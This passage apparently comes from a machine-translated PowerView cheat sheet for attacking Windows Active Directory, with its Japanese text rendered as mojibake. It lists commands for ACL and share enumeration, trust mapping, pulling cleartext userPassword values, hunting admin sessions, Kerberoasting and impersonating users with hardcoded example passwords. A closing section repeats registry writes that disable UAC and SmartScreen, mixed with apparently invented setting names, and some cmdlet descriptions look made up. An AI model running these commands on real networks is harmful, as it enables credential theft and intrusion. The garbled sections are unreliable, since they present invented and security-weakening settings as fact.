- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã®é©ç”¨ï¼šã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã‚’é©ç”¨ã—ã¦ã€ä¸æ­£ãªã‚¢ã‚¯ã‚»ã‚¹ã‚’é˜²æ­¢ã—ã¾ã™ã€‚
- ç›£æŸ»ãƒ­ã‚°ã®æœ‰åŠ¹åŒ–ï¼šã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’ç›£æŸ»ãƒ­ã‚°ã«è¨˜éŒ²ã™ã‚‹ã“ã¨ã§ã€ä¸æ­£ãªã‚¢ã‚¯ã‚»ã‚¹ã‚’æ¤œçŸ¥ã§ãã¾ã™ã€‚

ACLã®æ‚ªç”¨ã«é–¢ã™ã‚‹è©³ç´°ãªæƒ…å ±ã¯ã€[ã“ã¡ã‚‰ã®ãƒªãƒ³ã‚¯](../active-directory-methodology/acl-persistence-abuse/)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚
```powershell
#Get ACLs of an object (permissions of other objects over the indicated one)
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs

#Other way to get ACLs of an object
$sid = Convert-NameToSid <username/group>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

#Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

#Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs

#Check if any of the interesting permissions founds is realated to a username/group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}

#Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights
```
### å…±æœ‰ãƒ•ã‚¡ã‚¤ãƒ«ã¨ãƒ•ã‚©ãƒ«ãƒ€

PowerView provides several commands to enumerate shared files and folders on a target system. These commands can be useful for gathering information about the file and folder permissions, as well as identifying potential vulnerabilities.

#### Get-NetShare

The `Get-NetShare` command allows you to retrieve a list of shared folders on the target system. This can be useful for identifying sensitive files or folders that may be accessible to unauthorized users.

```powershell
Get-NetShare
```

#### Get-NetFileServer

The `Get-NetFileServer` command provides information about file servers on the target system. This includes details such as the server name, domain, and operating system version.

```powershell
Get-NetFileServer
```

#### Get-NetFileShare

The `Get-NetFileShare` command retrieves information about file shares on the target system. This includes details such as the share name, path, and permissions.

```powershell
Get-NetFileShare
```

#### Get-NetFileSharePermission

The `Get-NetFileSharePermission` command allows you to view the permissions associated with a specific file share on the target system.

```powershell
Get-NetFileSharePermission -ShareName "ShareName"
```

By using these PowerView commands, you can effectively enumerate shared files and folders on a target system, gaining valuable insights into potential security weaknesses.
```powershell
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters
```
### ãƒ‰ãƒ¡ã‚¤ãƒ³ä¿¡é ¼

Domain trust refers to the relationship established between two domains in a Windows Active Directory environment. It allows users from one domain to access resources in another domain. Trust relationships can be one-way or two-way, and they can be transitive or non-transitive.

ãƒ‰ãƒ¡ã‚¤ãƒ³ä¿¡é ¼ã¨ã¯ã€Windows Active Directoryç’°å¢ƒã«ãŠã„ã¦2ã¤ã®ãƒ‰ãƒ¡ã‚¤ãƒ³é–“ã§ç¢ºç«‹ã•ã‚Œã‚‹é–¢ä¿‚ã‚’æŒ‡ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€1ã¤ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä»–ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¿¡é ¼é–¢ä¿‚ã¯ç‰‡æ–¹å‘ã¾ãŸã¯åŒæ–¹å‘ã§ã‚ã‚Šã€æ¨ç§»çš„ã¾ãŸã¯éæ¨ç§»çš„ã§ã‚ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

#### Types of Trust Relationships

#### ä¿¡é ¼é–¢ä¿‚ã®ç¨®é¡

There are several types of trust relationships that can be established between domains:

ãƒ‰ãƒ¡ã‚¤ãƒ³é–“ã§ç¢ºç«‹ã§ãã‚‹ä¿¡é ¼é–¢ä¿‚ã«ã¯ã€ã„ãã¤ã‹ã®ç¨®é¡ãŒã‚ã‚Šã¾ã™ã€‚

- One-way trust: In this type of trust, Domain A trusts Domain B, but Domain B does not trust Domain A. This means that users in Domain A can access resources in Domain B, but users in Domain B cannot access resources in Domain A.

- ç‰‡æ–¹å‘ä¿¡é ¼: ã“ã®ã‚¿ã‚¤ãƒ—ã®ä¿¡é ¼é–¢ä¿‚ã§ã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³Aã¯ãƒ‰ãƒ¡ã‚¤ãƒ³Bã‚’ä¿¡é ¼ã—ã¾ã™ãŒã€ãƒ‰ãƒ¡ã‚¤ãƒ³Bã¯ãƒ‰ãƒ¡ã‚¤ãƒ³Aã‚’ä¿¡é ¼ã—ã¾ã›ã‚“ã€‚ã¤ã¾ã‚Šã€ãƒ‰ãƒ¡ã‚¤ãƒ³Aã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ‰ãƒ¡ã‚¤ãƒ³Bã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ãŒã€ãƒ‰ãƒ¡ã‚¤ãƒ³Bã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ‰ãƒ¡ã‚¤ãƒ³Aã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã›ã‚“ã€‚

- Two-way trust: In this type of trust, both Domain A and Domain B trust each other. This means that users in both domains can access resources in the other domain.

- åŒæ–¹å‘ä¿¡é ¼: ã“ã®ã‚¿ã‚¤ãƒ—ã®ä¿¡é ¼é–¢ä¿‚ã§ã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³Aã¨ãƒ‰ãƒ¡ã‚¤ãƒ³Bã®ä¸¡æ–¹ãŒãŠäº’ã„ã‚’ä¿¡é ¼ã—ã¾ã™ã€‚ã¤ã¾ã‚Šã€ä¸¡æ–¹ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ä»–ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

- Transitive trust: In a transitive trust relationship, if Domain A trusts Domain B and Domain B trusts Domain C, then Domain A also trusts Domain C. This allows users in Domain A to access resources in Domain C.

- æ¨ç§»çš„ä¿¡é ¼: æ¨ç§»çš„ä¿¡é ¼é–¢ä¿‚ã§ã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³AãŒãƒ‰ãƒ¡ã‚¤ãƒ³Bã‚’ä¿¡é ¼ã—ã€ãƒ‰ãƒ¡ã‚¤ãƒ³BãŒãƒ‰ãƒ¡ã‚¤ãƒ³Cã‚’ä¿¡é ¼ã™ã‚‹å ´åˆã€ãƒ‰ãƒ¡ã‚¤ãƒ³Aã¯ãƒ‰ãƒ¡ã‚¤ãƒ³Cã‚‚ä¿¡é ¼ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ‰ãƒ¡ã‚¤ãƒ³Aã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ‰ãƒ¡ã‚¤ãƒ³Cã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

- Non-transitive trust: In a non-transitive trust relationship, trust is limited to the directly trusted domains only. For example, if Domain A trusts Domain B and Domain B trusts Domain C, Domain A does not automatically trust Domain C.

- éæ¨ç§»çš„ä¿¡é ¼: éæ¨ç§»çš„ä¿¡é ¼é–¢ä¿‚ã§ã¯ã€ä¿¡é ¼ã¯ç›´æ¥ä¿¡é ¼ã•ã‚ŒãŸãƒ‰ãƒ¡ã‚¤ãƒ³ã«é™å®šã•ã‚Œã¾ã™ã€‚ä¾‹ãˆã°ã€ãƒ‰ãƒ¡ã‚¤ãƒ³AãŒãƒ‰ãƒ¡ã‚¤ãƒ³Bã‚’ä¿¡é ¼ã—ã€ãƒ‰ãƒ¡ã‚¤ãƒ³BãŒãƒ‰ãƒ¡ã‚¤ãƒ³Cã‚’ä¿¡é ¼ã™ã‚‹å ´åˆã€ãƒ‰ãƒ¡ã‚¤ãƒ³Aã¯è‡ªå‹•çš„ã«ãƒ‰ãƒ¡ã‚¤ãƒ³Cã‚’ä¿¡é ¼ã—ã¾ã›ã‚“ã€‚

#### Trust Enumeration with PowerView

#### PowerViewã«ã‚ˆã‚‹ä¿¡é ¼é–¢ä¿‚ã®åˆ—æŒ™

PowerView is a PowerShell tool that can be used to enumerate and manipulate domain trust relationships. It provides several functions that can be used to gather information about trust relationships in a Windows Active Directory environment.

PowerViewã¯ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ä¿¡é ¼é–¢ä¿‚ã‚’åˆ—æŒ™ãŠã‚ˆã³æ“ä½œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹PowerShellãƒ„ãƒ¼ãƒ«ã§ã™ã€‚Windows Active Directoryç’°å¢ƒã«ãŠã‘ã‚‹ä¿¡é ¼é–¢ä¿‚ã«é–¢ã™ã‚‹æƒ…å ±ã‚’åé›†ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã„ãã¤ã‹ã®é–¢æ•°ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚

To enumerate trust relationships using PowerView, you can use the `Get-NetDomainTrust` function. This function retrieves information about the trust relationships for the current domain or for a specified domain.

PowerViewã‚’ä½¿ç”¨ã—ã¦ä¿¡é ¼é–¢ä¿‚ã‚’åˆ—æŒ™ã™ã‚‹ã«ã¯ã€`Get-NetDomainTrust`é–¢æ•°ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®é–¢æ•°ã¯ã€ç¾åœ¨ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã¾ãŸã¯æŒ‡å®šã—ãŸãƒ‰ãƒ¡ã‚¤ãƒ³ã®ä¿¡é ¼é–¢ä¿‚ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã—ã¾ã™ã€‚

For example, to enumerate trust relationships for the current domain, you can run the following command:

ä¾‹ãˆã°ã€ç¾åœ¨ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ä¿¡é ¼é–¢ä¿‚ã‚’åˆ—æŒ™ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

```plaintext
Get-NetDomainTrust
```

This will display information about the trust relationships, including the trusted domain name, trust type, and trust direction.

ã“ã‚Œã«ã‚ˆã‚Šã€ä¿¡é ¼é–¢ä¿‚ã«é–¢ã™ã‚‹æƒ…å ±ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚ä¿¡é ¼ã•ã‚ŒãŸãƒ‰ãƒ¡ã‚¤ãƒ³åã€ä¿¡é ¼ã‚¿ã‚¤ãƒ—ã€ãŠã‚ˆã³ä¿¡é ¼æ–¹å‘ãªã©ãŒå«ã¾ã‚Œã¾ã™ã€‚
```powershell
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-DomainTrust #Same
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts

Get-ForestDomain # Get basic forest info
Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"

Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)

Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```
### ä½ã„ãƒãƒ¼ãƒ‰ãƒ«ã®æœå®Ÿ

ä½ã„ãƒãƒ¼ãƒ‰ãƒ«ã®æœå®Ÿï¼ˆLow-hanging fruitï¼‰
```powershell
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```
### å‰Šé™¤ã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ

Deleted objects are objects in Active Directory that have been deleted but are still recoverable. When an object is deleted, it is not immediately removed from the directory database. Instead, it is marked as deleted and moved to the Deleted Objects container. This allows for the possibility of restoring the object if needed.

Powerview provides several commands to interact with deleted objects in Active Directory:

- `Get-DomainDeletedObject`: This command retrieves deleted objects from the Deleted Objects container.
- `Restore-DomainObject`: This command restores a deleted object from the Deleted Objects container to its original location.
- `Remove-DomainObject`: This command permanently removes a deleted object from the Deleted Objects container.

By leveraging these Powerview commands, pentesters can explore and potentially recover deleted objects in Active Directory, which can provide valuable information for further exploitation.
```powershell
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the AD Recycle Bin group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### ãã®ä»–

#### SIDã‹ã‚‰åå‰ã¸ã®å¤‰æ›
```powershell
"S-1-5-21-1874506631-3219952063-538504511-2136" | Convert-SidToName
```
#### Kerberoast

Kerberoastã¯ã€Active Directoryï¼ˆADï¼‰ç’°å¢ƒã§ä½¿ç”¨ã•ã‚Œã‚‹Kerberosèªè¨¼ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã™ã‚‹æ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚ã“ã®æ”»æ’ƒã§ã¯ã€æ”»æ’ƒè€…ã¯ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒãƒƒã‚·ãƒ¥ã‚’å–å¾—ã—ã€ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ã§è§£æã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€PowerViewãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç‰¹å®šã—ã€ãã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒãƒƒã‚·ãƒ¥ã‚’å–å¾—ã—ã¾ã™ã€‚æ¬¡ã«ã€æ”»æ’ƒè€…ã¯ãƒãƒƒã‚·ãƒ¥ã‚’è§£æã—ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

Kerberoastæ”»æ’ƒã¯ã€æ”»æ’ƒè€…ãŒãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãªã‚‹ã“ã¨ãªãã€ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ãŸã‚ã€éå¸¸ã«å±é™ºã§ã™ã€‚ã“ã®æ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€å¼·åŠ›ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒªã‚·ãƒ¼ã®å®Ÿæ–½ã‚„ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ç‰¹æ¨©ã‚’åˆ¶é™ã™ã‚‹ãªã©ã®å¯¾ç­–ãŒå¿…è¦ã§ã™ã€‚
```powershell
Invoke-Kerberoast [-Identity websvc] #Without "-Identity" kerberoast all possible users
```
#### ç•°ãªã‚‹è³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ï¼ˆå¼•æ•°ï¼‰

You can use different credentials when executing PowerShell commands by specifying the `-Credential` argument. This allows you to run commands with the privileges of a different user or account.

To use different credentials, you need to create a `PSCredential` object that contains the username and password of the desired account. You can create this object using the `Get-Credential` cmdlet.

Here is an example of how to use different credentials with PowerShell:

```powershell
$cred = Get-Credential
Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock { <command> }
```

In this example, the `Get-Credential` cmdlet prompts you to enter the username and password for the desired account. The `$cred` variable stores the `PSCredential` object.

The `Invoke-Command` cmdlet is then used to execute a command on the specified target computer (`<target>`) using the specified credentials (`$cred`). You can replace `<command>` with the actual command you want to execute.

By using different credentials, you can perform actions or access resources that are restricted to specific users or accounts. This can be useful during penetration testing or when performing tasks that require elevated privileges.
```powershell
# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```
#### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãªã‚Šã™ã¾ã—

To impersonate a user, you can use the `Invoke-UserImpersonation` function from PowerView. This function allows you to execute commands as if you were the specified user.

```powershell
Invoke-UserImpersonation -Username <username> -Command <command>
```

Replace `<username>` with the username of the user you want to impersonate, and `<command>` with the command you want to execute as that user.

Example:

```powershell
Invoke-UserImpersonation -Username Administrator -Command "net user"
```

This will execute the `net user` command as the Administrator user.
```powershell
# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```
#### å€¤ã®è¨­å®š

```powershell
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'Hidden' -Value 1
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'HideFileExt' -Value 0
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'ShowSuperHidden' -Value 1
```

```powershell
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'AutoShareWks' -Value 0
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name 'AutoShareServer' -Value 0
```

```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorUser' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableVirtualizationBasedSecurity' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableUIADesktopToggle' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'PromptOnSecureDesktop' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureUIAPaths' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'FilterAdministratorToken' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableInstallerDetection' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureBootLogging' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSmartScreen' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableRemoteShellAccess' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCursorSuppression' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCursorSuppressionTimeout' -Value 2000
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCredSSPSupport' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLinkedConnections' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureUIAPaths' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableUIADesktopToggle' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'FilterAdministratorToken' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'PromptOnSecureDesktop' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorUser' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableVirtualizationBasedSecurity' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableInstallerDetection' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureBootLogging' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSmartScreen' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableRemoteShellAccess' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCursorSuppression' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCursorSuppressionTimeout' -Value 2000
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCredSSPSupport' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLinkedConnections' -Value 0
```

```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorUser' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableVirtualizationBasedSecurity' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableUIADesktopToggle' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'PromptOnSecureDesktop' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureUIAPaths' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'FilterAdministratorToken' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableInstallerDetection' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureBootLogging' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSmartScreen' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableRemoteShellAccess' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCursorSuppression' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCursorSuppressionTimeout' -Value 2000
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableCredSSPSupport' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLinkedConnections' -Value 0
```

```powershell
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorUser' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableVirtualizationBasedSecurity' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableUIADesktopToggle' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'PromptOnSecureDesktop' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableSecureUIAPaths' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'FilterAdministratorToken' -Value 1
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableInstallerDetection' -Value 1
